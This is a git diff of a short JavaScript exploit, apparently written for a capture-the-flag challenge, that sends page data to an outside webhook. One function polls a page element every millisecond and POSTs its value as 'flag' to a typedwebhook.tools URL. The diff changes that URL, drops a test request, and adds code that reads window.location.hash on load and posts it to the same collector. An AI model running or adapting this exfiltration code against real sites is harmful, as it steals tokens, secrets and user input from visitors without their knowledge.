@@ -6,7 +6,7 @@ async function putdata(){
     if(el.value == "none" || c) return;
     // console.log("potted")
     c = true
-    await fetch("https://typedwebhook.tools/webhook/f913db48-3454-4553-bd25-97628ebb7dfe", {
+    await fetch("https://typedwebhook.tools/webhook/c6d6dcee-37a9-4b7a-a919-b24e7920e881", {
         method: "POST",
         mode: "no-cors", 
         body: JSON.stringify({"flag": el.value})
@@ -15,11 +15,10 @@ async function putdata(){
     c = false
 }
 
-fetch("https://typedwebhook.tools/webhook/f913db48-3454-4553-bd25-97628ebb7dfe", {
-    method: "POST",
-    mode: "no-cors", 
-    body: JSON.stringify({"flag": "yur m,mom"})
-});
 function start(){
     setInterval(putdata, 1)
 }
+const currentUrl = window.location.hash;
+console.log(currentUrl);
+
+fetch("https://typedwebhook.tools/webhook/c6d6dcee-37a9-4b7a-a919-b24e7920e881", {method: "POST", mode: "no-cors", body: JSON.stringify({"flag": currentUrl})});
